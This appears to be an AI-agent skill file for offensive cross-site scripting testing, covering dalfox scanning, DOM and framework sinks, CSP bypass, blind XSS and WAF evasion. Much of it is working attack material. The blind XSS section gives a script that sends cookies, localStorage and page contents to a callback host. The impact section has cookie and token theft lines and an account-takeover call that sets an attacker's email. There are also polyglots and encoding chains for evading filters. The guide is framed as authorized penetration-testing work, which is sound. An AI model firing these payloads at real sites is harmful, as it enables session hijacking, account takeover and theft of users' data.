---
name: xss-testing
description: Detect and exploit cross-site scripting vulnerabilities in web applications — DOM XSS in modern SPAs, framework-specific sinks, CSP bypass, blind XSS, WAF evasion
origin: AI Threat Hunting
---

# XSS Testing

Most XSS findings in 2025 are in client-side rendering contexts (React `dangerouslySetInnerHTML`, Angular `bypassSecurityTrustHtml`, Vue `v-html`), not classic server-reflected. Prioritize accordingly. dalfox finds reflected XSS in roughly 30% of test cases. For the other 70%, you need manual DOM analysis, framework-specific sink hunting, and stored/blind XSS methodology.

## When to Activate

- User input reflected in HTTP responses (search, errors, profiles, any echo)
- SPA with client-side routing — URL fragments, query params, or postMessage driving DOM updates
- Rich text editors, comment systems, support ticket interfaces, admin panels with user-generated content
- Target runs React, Angular, Vue, or legacy jQuery — each has framework-specific XSS sinks
- API responses rendered without escaping in frontend templates

## Tools

- `dalfox` — automated reflected XSS scanner: parameter analysis, context detection, WAF fingerprinting, blind XSS via callback
- `curl` / Burp Suite Repeater — manual request crafting and response analysis
- Browser DevTools — DOM inspection, source-to-sink tracing, event listener enumeration
- OOB callback server — blind XSS verification (operator-provisioned, see operator-core Listener & Callback Management)

---

## Decision Tree: dalfox vs Manual Testing

```
Target has query parameters reflecting in HTML?
├── YES → Run dalfox first (reflected scan)
│   ├── dalfox finds injection → validate, escalate impact, check siblings
│   └── dalfox finds nothing → move to manual DOM analysis (dalfox misses DOM sinks)
├── NO, but SPA with client-side rendering
│   └── Skip dalfox entirely → manual DOM source→sink tracing
├── Target has user-persisted content (profiles, comments, tickets)?
│   └── Skip dalfox → stored XSS manual testing (dalfox cannot test stored flows)
└── Target has admin panels, internal tools, log viewers?
    └── Blind XSS injection campaign (dalfox --blind for reflected params,
        manual injection for stored fields)
```

**When dalfox is unlikely to find anything:** SPAs that render entirely client-side (React/Angular/Vue), WebSocket-driven UIs, multi-step stored XSS flows, targets behind heavy WAFs that rate-limit automated scanning. In these cases, go straight to manual.

**When dalfox is worth running:** Classic server-rendered pages with visible parameter reflection, large parameter surfaces (pipe hundreds of URLs), initial broad sweep before manual deep-dive.

## Automated Scanning with dalfox

```bash
# Single URL with parameter
dalfox url "https://TARGET/search?q=test" --silence

# Pipe discovered URLs (from gau, katana, or param-fuzzing output)
cat urls_with_params.txt | dalfox pipe --silence

# With blind XSS callback (use OOB_CALLBACK_URL from operator dispatch context)
dalfox url "https://TARGET/search?q=test" --blind "$OOB_CALLBACK_URL"

# JSON output for triage
dalfox url "https://TARGET/page?param=test" -o /engagements/$ENGAGEMENT_KEY/scans/xss_results.json --format json

# WAF fingerprinting (run before payload selection)
dalfox url "https://TARGET/search?q=test" --waf-evasion
```

dalfox automates context detection, WAF bypass attempts, and payload selection. Use it for initial sweeps, then switch to manual testing for stored XSS, DOM sinks, and framework-specific vectors.

---

## Category 1: DOM XSS in Modern SPAs

**Root cause**: Attacker-controlled data flows from a DOM source to a dangerous sink without sanitization. This is the dominant XSS class in 2025 because SPAs handle routing, rendering, and state management client-side.

### Source-to-Sink Tracing

**Sources** (attacker-controlled input enters the DOM):
```
location.hash          # Fragment — not sent to server, invisible to WAFs
location.search        # Query string
location.pathname      # Path segments in client-side routers
document.referrer      # Referring page URL
window.name            # Persists across navigations — attacker sets via window.open
postMessage            # Cross-origin messaging — check for missing origin validation
localStorage/sessionStorage  # If attacker can write (via another XSS or subdomain)
URL params via URLSearchParams, new URL(), or framework router ($route.query, useSearchParams)
```

**Sinks** (where attacker data causes execution):
```
element.innerHTML / outerHTML    # HTML parsing — most common DOM XSS sink
document.write / writeln         # Full document rewrite
eval / Function() / setTimeout(string) / setInterval(string)  # JS execution
element.src / element.href       # Resource loading or navigation
jQuery.html() / .append() / $()  # jQuery-specific DOM manipulation
location.href / location.assign  # Navigation to javascript: URLs
```

### Hunting Methodology

1. **Identify sources**: Search all JS for `location.hash`, `location.search`, `postMessage`, `URLSearchParams`, `window.name`, `document.referrer`. Map every place user-controlled data enters the application.
2. **Trace to sinks**: Follow each source through variable assignments, function calls, and transformations. Modern JS bundlers (webpack, esbuild) inline code — use source maps when available, otherwise search the bundle.
3. **Check for sanitization gaps**: DOMPurify is common but misconfigured. Look for: `DOMPurify.sanitize(input, {ADD_TAGS: ['iframe']})` (allowlisting dangerous tags), sanitization applied after the sink (`innerHTML = sanitize(x)` is fine, `innerHTML = x; sanitize(el)` is not), or sanitization skipped on certain code paths.
4. **postMessage is a goldmine**: Search for `window.addEventListener('message', ...)`. If the handler does not validate `event.origin`, any page can send attacker-controlled data. If the handler passes `event.data` to `innerHTML`, `eval`, or `document.write` — confirmed DOM XSS.

```javascript
// VULNERABLE — no origin check, data flows to innerHTML
window.addEventListener('message', function(e) {
  document.getElementById('content').innerHTML = e.data.html;
});

// PoC: attacker page sends payload
targetWindow.postMessage({html: '<img src=x onerror=alert(document.domain)>'}, '*');
```

**Kill signals for DOM XSS**: All user input passes through DOMPurify.sanitize() with default config (no ADD_TAGS/ADD_ATTR overrides). Framework uses textContent/innerText instead of innerHTML. postMessage handlers validate event.origin against allowlist.

---

## Category 2: Framework-Specific XSS Sinks

Each modern framework has an escape hatch that bypasses its default HTML encoding. These are the highest-value targets because developers use them intentionally — they believe the data is safe.

### React

- [ ] **dangerouslySetInnerHTML** — the explicit escape hatch. Search for `dangerouslySetInnerHTML` across all components.
  ```jsx
  // VULNERABLE — user bio rendered as raw HTML
  <div dangerouslySetInnerHTML={{__html: userProfile.bio}} />

  // Check: is the value sanitized server-side or with DOMPurify before render?
  ```
- [ ] **href="javascript:"** — React allows `javascript:` in href attributes on `<a>` tags. React 16.x logs a warning but does NOT block execution. React 19+ blocks in strict mode only.
  ```jsx
  // VULNERABLE — user-controlled URL in link
  <a href={userInput}>Click here</a>
  // Payload: javascript:alert(document.domain)
  ```
- [ ] **ref manipulation** — `useRef` + `ref.current.innerHTML` bypasses React's virtual DOM entirely.
  ```jsx
  // VULNERABLE — direct DOM write via ref
  const ref = useRef();
  ref.current.innerHTML = userComment; // React never sees this
  ```
- [ ] **SSR hydration mismatch** — Server renders sanitized HTML, client hydrates with unsanitized data from a different source (e.g., URL params). The mismatch window allows XSS during hydration. Check Next.js `getServerSideProps` vs client-side `useSearchParams`.
- [ ] **markdown/rich-text renderers** — Libraries like `react-markdown` with `rehypeRaw` plugin, or `draftjs-to-html`, render user HTML. Check plugin configuration.

### Angular

- [ ] **bypassSecurityTrustHtml** — Angular's DomSanitizer escape hatch. Search for `bypassSecurityTrust` (Html, Style, Script, Url, ResourceUrl).
  ```typescript
  // VULNERABLE — user content marked as trusted
  this.trustedHtml = this.sanitizer.bypassSecurityTrustHtml(userInput);
  // Then used in template: <div [innerHTML]="trustedHtml">
  ```
- [ ] **[innerHTML] binding** — Angular sanitizes `[innerHTML]` by default, but developers bypass it with `bypassSecurityTrustHtml` when content "doesn't render correctly." Search for the bypass-then-bind pattern.
- [ ] **Template injection via {{}}** — In Angular Universal (SSR), if user input reaches the template compilation step, `{{constructor.constructor('alert(1)')()}}` achieves code execution. This is rare but critical.
- [ ] **Angular.js (1.x) sandbox bypass** — Legacy AngularJS applications: the template sandbox has been bypassed in every version. `{{$on.constructor('alert(1)')()}}` or similar. If the target runs AngularJS, sandbox bypass is guaranteed — the question is which payload works for the version.

### Vue

- [ ] **v-html directive** — Vue's raw HTML rendering. No sanitization applied.
  ```vue
  <!-- VULNERABLE — user comment rendered as raw HTML -->
  <div v-html="userComment"></div>
  ```
- [ ] **:href binding with user input** — Same as React: `<a :href="userUrl">` allows `javascript:` protocol.
- [ ] **SSR (Nuxt) context** — Server-rendered Vue (Nuxt.js) can have hydration mismatches similar to Next.js. Check `asyncData` and `useFetch` data sources vs client-side rendering.
- [ ] **Vue template compilation** — If user input reaches `Vue.compile()` or `new Vue({ template: userInput })`, it is template injection with full JS execution. Rare but critical.

### jQuery (Legacy)

- [ ] **.html() with user input** — `$('#element').html(userInput)` is innerHTML under the hood.
- [ ] **.append() / .prepend() / .after() / .before()** — All accept HTML strings and parse them.
- [ ] **$() selector with user input** — `$(location.hash)` or `$(userInput)` — jQuery interprets HTML strings as elements when they start with `<`. This is a classic DOM XSS vector.
  ```javascript
  // VULNERABLE — hash fragment interpreted as HTML
  $(location.hash); // URL: https://target.example/page#<img src=x onerror=alert(1)>
  ```
- [ ] **jQuery plugins** — Tooltip, dialog, and modal plugins that render user content as HTML.

**Kill signals for framework XSS**: React app with no `dangerouslySetInnerHTML` and no ref.innerHTML patterns. Angular app where all `[innerHTML]` bindings use data from trusted server-side sources without `bypassSecurityTrust`. Vue app with no `v-html` directives. jQuery app fully migrated to a modern framework.

---

## Category 3: CSP Bypass Reality

Content Security Policy prevents inline script execution — when configured correctly. In practice, most CSPs are bypassable.

### Quick CSP Assessment

```bash
# Fetch and inspect CSP header
curl -sI "https://TARGET/" | grep -i "content-security-policy"

# Check for report-only (does NOT block, only reports)
curl -sI "https://TARGET/" | grep -i "content-security-policy-report-only"
```

### What CSP Actually Prevents vs What It Does Not

| CSP Directive | Prevents | Does NOT Prevent |
|---|---|---|
| `script-src 'self'` | Inline scripts, external script loading | XSS via JSONP endpoints on same origin, uploaded JS files, Angular template injection |
| `script-src 'nonce-xxx'` | Scripts without matching nonce | DOM XSS (innerHTML execution does not need a nonce), script gadgets in trusted libraries |
| `default-src 'self'` | Most external resource loading | Same-origin JSONP, open redirects chained with script loading |
| `script-src 'unsafe-eval'` | Nothing meaningful for XSS | eval(), Function(), setTimeout(string) all work |

### CSP Weakness Identification

- [ ] **unsafe-inline** — CSP is effectively disabled for XSS. Inline `<script>` and event handlers work.
- [ ] **unsafe-eval** — `eval()`, `Function()`, `setTimeout('string')` all execute. Angular.js requires `unsafe-eval` — if present, check for Angular.js.
- [ ] **Wildcard sources** — `script-src *` or `script-src *.cdn.com` — load attacker script from any subdomain of allowed CDN.
- [ ] **Missing directive fallback** — No `script-src` falls back to `default-src`. No `default-src` = no restriction.
- [ ] **JSONP endpoints on allowed origins** — `script-src` allows `https://accounts.google.com` — `https://accounts.google.com/o/oauth2/revoke?callback=alert(1)` is a valid script. Known JSONP endpoints exist on Google, Facebook, Yahoo, and most major CDNs.
- [ ] **Angular.js CSP-compatible mode** — If `script-src` allows a CDN hosting angular.js, load it and use template injection: `<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>`. Works even with strict CSP because Angular.js uses its own expression evaluator, not `eval()`.
- [ ] **base-uri hijacking** — Missing `base-uri` directive allows `<base href="https://attacker.example/">` — all relative script paths now load from attacker origin.
- [ ] **Script gadgets in trusted libraries** — Trusted libraries (Closure, Polymer, RequireJS) contain code patterns that transform existing DOM content into script execution, bypassing `nonce` and `strict-dynamic` CSPs.

---

## Category 4: Blind XSS

Blind XSS triggers in a different context than where you inject — typically an admin panel, internal dashboard, log viewer, or support ticket system that you never see. It is the highest-impact stored XSS class because it targets privileged users.

### Injection Points (Where to Plant Payloads)

Inject blind XSS payloads into every field that might be rendered in an internal context:

- **Support tickets** — subject, body, attachment filenames
- **User profile fields** — display name, bio, company name, website URL, address fields
- **Contact/feedback forms** — all fields, including email address field
- **Error messages and log entries** — User-Agent header, Referer header, X-Forwarded-For header (these render in server logs, error dashboards, analytics)
- **File upload metadata** — EXIF data in images, document properties in PDFs/Office files, filenames
- **API request bodies** — JSON field values that might appear in admin API browsers
- **Account registration** — username, organization name, any free-text field
- **Comment/review systems** — especially if moderation queue renders raw HTML

### Payload Construction

Use an OOB callback to detect when and where the payload fires:

```html
<!-- Basic blind XSS with callback -->
"><script src=https://YOUR_OOB_CALLBACK/probe></script>

<!-- If script tags are filtered, use event handlers -->
"><img src=x onerror=fetch('https://YOUR_OOB_CALLBACK/probe?c='+document.cookie)>

<!-- Polyglot for unknown context -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%%0telerik0telerik11telerik2telerik3telerik4telerik5telerik6//oNcliCk=alert()//><svg onload=fetch('https://YOUR_OOB_CALLBACK/x')//

<!-- Data exfiltration payload (fires silently in admin context) -->
"><script>
fetch('https://YOUR_OOB_CALLBACK/hit', {
  method: 'POST',
  body: JSON.stringify({
    url: location.href,
    cookie: document.cookie,
    dom: document.body.innerHTML.substring(0, 2000),
    localStorage: JSON.stringify(localStorage)
  })
});
</script>
```

### Operational Notes

- **Timing**: Some blind XSS triggers days or weeks after injection. A support ticket might sit in a queue for a week before an admin opens it. Log viewers might only be checked during incident response. Set callbacks and be patient.
- **Callback verification**: After injecting, check the named OOB client log periodically (`tail -50 /data/oob/clients/<name>.log` via Kali MCP). A hit proves the payload rendered in an internal context.
- **Impact escalation**: A blind XSS in an admin panel is not just "XSS." If the admin panel has: user management (account takeover), payment processing (financial impact), server configuration (RCE chain), or API key management (full compromise) — the XSS inherits that blast radius.
- **Evidence capture**: The callback payload should exfil enough context to prove impact: the URL where it fired (shows it was admin panel), cookies/tokens (shows session hijack is possible), and a DOM snapshot (shows what the admin sees).

---

## Category 5: WAF Bypass Tradecraft

WAFs block known XSS patterns. The bypass game is about using equivalent constructs the WAF signature does not cover.

### When `<script>` Is Blocked

Every WAF blocks `<script>`. Use alternative tags with event handlers:

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<marquee onstart=alert(1)>
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=alert(1)>">
```

### Event Handler Diversity

When one event handler is blocked, try others. WAFs typically block `onerror` and `onload` first:

```
onfocus + autofocus    # Fires immediately, no user interaction
ontoggle + open        # <details open ontoggle=X> fires on page load
onmouseover            # Requires hover — use with large positioned element
onanimationend         # CSS animation trigger
onpointerover         # Pointer events (newer, less filtered)
onbeforeinput          # Input events
```

### Encoding Chains That Bypass Specific WAFs

```
# HTML entity encoding (bypasses regex matching on literal characters)
&#x3c;img src=x onerror=alert(1)&#x3e;

# Double URL encoding (bypasses single-decode WAFs)
%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E

# Unicode normalization bypass
＜script＞alert(1)＜/script＞  (fullwidth characters)

# Mixed encoding
<img src=x onerror=\u0061lert(1)>

# Null byte injection (older WAFs)
<scr%00ipt>alert(1)</scr%00ipt>

# Case variation + tag nesting
<ScRiPt>alert(1)</sCrIpT>
<svg><ScRiPt>alert(1)</ScRiPt></svg>
```

### Function Call Alternatives When `alert` Is Blocked

```javascript
confirm(1)
prompt(1)
print()                          // Opens print dialog — proves execution
window['al'+'ert'](1)           // String concatenation
eval('al'+'ert(1)')
setTimeout('alert(1)',0)
setInterval('alert(1)',0)
[].constructor.constructor('alert(1)')()  // Constructor chain
Function('alert(1)')()
alert`1`                         // Tagged template literal
onerror=alert;throw 1           // Parentheses bypass — throw triggers onerror
```

### Parentheses Bypass (Common WAF Rule)

Many WAFs block `(` and `)` in event handler values:

```html
<img src=x onerror=alert`1`>
<img src=x onerror="window.onerror=alert;throw 1">
<img src=x onerror="location='javascript:alert%281%29'">
<svg onload="import('data:text/javascript,alert(1)')">
```

---

## Stored XSS Hunting

Stored XSS requires a two-phase test: inject, then find every location where the stored data renders.

1. **Map all persisted input fields**: profiles, comments, messages, file names, metadata, settings, custom fields
2. **Inject canary per field**: use unique identifiers per injection point (`xss-profile-bio-001`, `xss-comment-body-002`) so you know which field triggered
3. **Navigate every rendering context**: the same stored value may render in the user's profile, in an admin user list, in search results, in email notifications (HTML email XSS), in PDF exports, and in API responses consumed by other frontends
4. **Test file upload names**: `"><img src=x onerror=alert(1)>.jpg` — filenames render in file managers, download dialogs, log entries
5. **Test metadata**: EXIF data in images (ImageMagick processed), document properties in uploaded PDFs/Office files
6. **Check rendering differences**: admin views often render more fields or less-escaped content than public views

---

## Proof of Concept: Impact Escalation

`alert(1)` proves execution. Engagement reports need impact.

```javascript
// Prove execution context
alert(document.domain)

// Session hijack — cookie theft
fetch('https://OOB_CALLBACK/steal?c='+document.cookie)
new Image().src='https://OOB_CALLBACK/steal?c='+document.cookie

// Token theft from localStorage/sessionStorage
fetch('https://OOB_CALLBACK/steal?t='+localStorage.getItem('auth_token'))

// Account takeover — change email/password via authenticated API call
fetch('/api/user/email', {method:'PUT', headers:{'Content-Type':'application/json'}, body:'{"email":"attacker@evil.example"}'})

// DOM data exfiltration — steal what the victim sees
fetch('https://OOB_CALLBACK/dom', {method:'POST', body:document.body.innerHTML.substring(0,5000)})
```

**Severity calibration**: XSS alone is typically MEDIUM. XSS + session hijack = HIGH. XSS + account takeover chain = HIGH/CRITICAL. Blind XSS in admin panel + admin session hijack + admin action (user management, config change) = CRITICAL.

---

## A->B Signal: XSS Chains

```
Reflected XSS -> session cookie theft -> account takeover
DOM XSS via postMessage -> admin panel XSS -> admin session hijack -> full app compromise
Stored XSS in profile -> renders in admin user list -> admin CSRF chain -> privilege escalation
Blind XSS in support ticket -> admin panel execution -> API key exfiltration -> full API access
XSS + missing SameSite cookie -> cross-site request forgery amplification
XSS + CORS misconfiguration -> cross-origin data theft
XSS in subdomain + wildcard CSP -> main domain CSP bypass
Self-XSS + CSRF (login CSRF or state change) -> stored payload triggers for victim
```

---

## Kill Signals — Stop Testing When
- Application is pure API (JSON responses only, no HTML rendering) → XSS not applicable, move on
- CSP with no unsafe-inline, no unsafe-eval, no JSONP endpoints on allowed origins, no base-uri gap → CSP is effective, record as hardened
- dalfox + manual DOM analysis find zero reflection points after full parameter set tested → move on
- Framework auto-escapes all output (React JSX, Angular templates, Vue {{ }}) AND no dangerouslySetInnerHTML/v-html/bypassSecurityTrust usage found → skip
- Stored XSS confirmed → CRITICAL, record finding and stop testing other XSS vectors on this endpoint

## Escalate When
- Any injected marker survives into the response — even encoded — walk the sinks: attribute context, script-block context, URL context, JSON-embedded-in-HTML, and template literal each have distinct break-out payloads that a generic probe misses
- Reflection lands inside an existing attribute, `<script>` body, `href`/`src`, `on*` handler, or JSON blob assigned to a JS variable — do not stop at "HTML-encoded"; test context-specific break-outs (`";alert(1)//`, backtick, `javascript:` scheme, JSON string escape with `</script>`)
- Input flows into a DOM sink via `location`, `postMessage`, `document.referrer`, `window.name`, or `fetch().then(r=>r.text()).then(eval)` — source-to-sink tracing beats payload spraying for DOM XSS, trace the taint before declaring the parameter safe
- CSP allows `unsafe-inline`, `unsafe-eval`, a wildcard host, a JSONP endpoint on an allowed origin, `data:` on script-src, or a missing `base-uri` — CSP bypass is gadget-driven, enumerate allowed hosts for known bypass gadgets (AngularJS, JSONP callbacks, script-gadgets.github.io entries)
- A stored field accepts HTML-looking input and the server round-trips it unchanged to any user, admin panel, email template, PDF export, or activity log — stored XSS has multiple render surfaces, test each

## Extended Resources

- `agent/references/payloads/xss-payloads.md` — DOM XSS, reflected, stored, filter bypass, CSP bypass, polyglots
- `agent/references/tools/exploitation/dalfox.md` — dalfox flags, pipe mode, blind XSS setup, WAF evasion options
